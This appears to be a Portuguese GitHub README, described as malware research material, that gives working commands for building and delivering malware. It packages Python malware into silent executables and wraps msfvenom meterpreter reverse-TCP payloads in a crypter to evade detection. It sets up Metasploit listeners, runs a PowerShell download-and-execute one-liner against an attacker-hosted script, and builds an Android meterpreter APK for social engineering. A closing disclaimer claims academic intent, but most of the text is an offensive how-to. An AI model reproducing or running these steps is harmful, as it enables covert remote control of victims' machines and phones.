## Malware python 
Aqui você encontrará exemplos de código, scripts para ajudar na compreensão e pesquisa de malware

Empacotando malware em python para um executável. 

Instalando o pyinstaller 
```bash
 pip install pyinstaller  
```
    
Criando Executável 
```bash
 pyinstaller -F --clean -w <nome_programa> 
```

-F  criar um arquivo executável. 

--clean remove esses arquivos temporários e de cache, deixando apenas o executável final gerado.

-w é usado para criar um executável sem console, o programa é executado silenciosamente sem interação do usuário.

## Combinando o Crypter com payloads do msfvenom 

#### Funcionamento de um Crypter: 
Como estamos usando o python, o malware.exe será criptografado dentro de um arquivo chamado stub.py. O arquivo stub.py é transformado em um executável, agora quando executado, acontece a descriptografia e a execução do malware.exe.
```bash
 malware > crypt > stub > executa > decrypt > malware >  executa malware 
```

Criando um payload.exe 
```bash
 msfvenom -a x64 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=IP_local LPORT=443 -f exe -o payload.exe
```
Payload + crypter
```bash
 python cripto_stub.py caminho/do/arquivo.exe nome_stub.py
```
Escutando com o msfconsole

```
 msfconsole use multi/handler
 set payload windows/meterpreter/reverse_tcp
```
[Click aqui para ver meu artigo sobre Exploits e Metasploit](https://medium.com/@robertocoliver/exploits-e-metasploit-6b338db4266)

## Obfuscação de shellcode com Veil

git clone na ferramenta Veil e entrando no diretório 
```
 https://github.com/Veil-Framework/Veil
 cd Veil/config
```
Instalando dependências 
```
 ./setup.sh            
```
#

## Payload powershell
 
Payloads de powershell disponíveis no msfvenom 
O payload .txt gerado pode ser passado diretamente no cmd ou executado em um arquivo .bat
```
 msfvenom --list payloads | grep -i powershell   
```

Escutar usando o msfconsole 
```
 msf6 > use exploit/multi/handler 
 msf6 exploit(multi/handler) > set payload windows/powershell_reverse_tcp  
```

Parametrização de parâmetros 
```
 set lhost=192.168.100.16
 set lport=443
 set exitonsession false
 exploit -j
 jobs 
```
![screenshot](https://github.com/robertocoliver/malware_python/assets/102238044/5813fb3b-3e19-4303-9f17-cd92538d9472)


## Downloader 

Iniciar o servidor apache e mover o powershell.txt para a pasta 
```
 service apache2 start
 mv powershell.txt  /var/www/html
```

Baixando e executando as strings com Powershell

```
 powershell.exe "iex((new-object system.net.webclient).downloadstring('http://192.168.100.16/powershell.txt')" 
```
![screenshot](https://github.com/robertocoliver/malware_python/assets/102238044/2d2152b2-c224-44ba-bc9c-63724be26bdd)


## Android meterpreter 
Payload para android:
```bash
 msfvenom -p android/meterpreter/reverse_tcp lhost=ip lport=porta -o payload.apk 
```
Engenharia social + payload meterpreter:
Baixe o script wrapper e apktool-2
```bash
 https://ibotpeaches.github.io/Apktool/install/
```
Dando permissão de execução 
```bash
 chmod +x  apktool.sh 
 chmod +x  apktool.jar
```
Instalar dependências 
```bash
 apt install zipalign 
 apt install openjdk-11-jdk 
 apt install jarsigner 
```

 


 Download Linux wrapper script (Right click, Save Link As apktool)
 Download apktool-2 (find newest here)
#### Aviso Legal
> Estes scripts destinam-se apenas a fins de teste e acadêmicos e só podem ser usados com o consentimento estrito das partes.
>  É responsabilidade do usuário final obedecer a todas as leis locais, estaduais e federais aplicáveis.
> Os desenvolvedores não assumem nenhuma responsabilidade e não são responsáveis por qualquer uso indevido ou danos causados por esta ferramenta e software em geral.
